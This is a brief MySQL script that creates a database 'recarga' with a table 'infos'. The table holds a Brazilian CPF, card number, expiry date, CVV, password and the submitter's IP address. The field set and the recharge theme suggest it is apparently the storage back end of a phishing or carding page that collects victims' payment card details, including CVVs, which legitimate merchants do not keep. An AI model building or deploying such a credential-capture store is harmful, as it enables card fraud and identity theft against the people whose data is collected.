drop database if exists `recarga`;

create database `recarga`
default character set utf8
default collate utf8_general_ci;

use `recarga`;

create table `infos`(
id int not null auto_increment,
`cpf` text not null,
`cc` text not null,
`date` text not null,
`cvv` text not null,
`pass` text not null default "Não Inserido",
`ip` text not null,
primary key (id)
)default charset = utf8;